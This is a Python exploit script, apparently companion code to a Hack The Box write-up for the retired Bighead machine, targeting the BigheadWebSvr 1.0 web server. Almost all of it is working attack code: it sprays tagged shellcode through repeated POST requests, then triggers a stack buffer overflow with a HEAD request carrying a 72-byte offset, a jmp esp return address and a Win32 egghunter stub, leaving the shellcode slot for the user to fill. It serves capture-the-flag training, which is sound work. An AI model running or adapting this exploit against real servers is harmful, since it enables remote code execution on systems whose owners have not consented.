#!/usr/bin/python

'''
Write-up : https://0xrick.github.io/hack-the-box/bighead/

Win32 egghunter Buffer Overflow exploit from Hack The Box retired box Bighead.
Vulnerable server : BigheadWebSvr 1.0 
		    https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip
'''

import socket
import binascii
import re

host = '10.10.10.112' # machine's ip
port = 80
egg = '' # replace this with the egg (any 4 chars word)

N = 0

buf =  "" # replace this with the shellcode (without \x)

shellcode = (egg * 2) + binascii.unhexlify(buf) # final shellcode
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7" # https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py

def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16): # repeats the request 16 times
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode)) 
		s.send("\r\n")
		s.send(shellcode+"\r\n") # sends the shellcode in a POST request
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"

def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n") # offset + new EIP (jmp esp) + egghunter
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"

send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
